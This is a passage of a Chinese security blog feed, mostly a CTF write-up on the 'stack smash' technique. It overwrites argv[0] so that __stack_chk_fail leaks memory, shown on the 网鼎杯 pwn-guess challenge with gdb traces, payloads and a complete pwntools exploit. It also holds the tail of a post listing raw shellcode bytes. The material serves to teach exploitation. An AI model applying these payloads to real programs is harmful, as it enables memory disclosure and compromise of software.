class="number">0x31</span>,main42=<span class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a 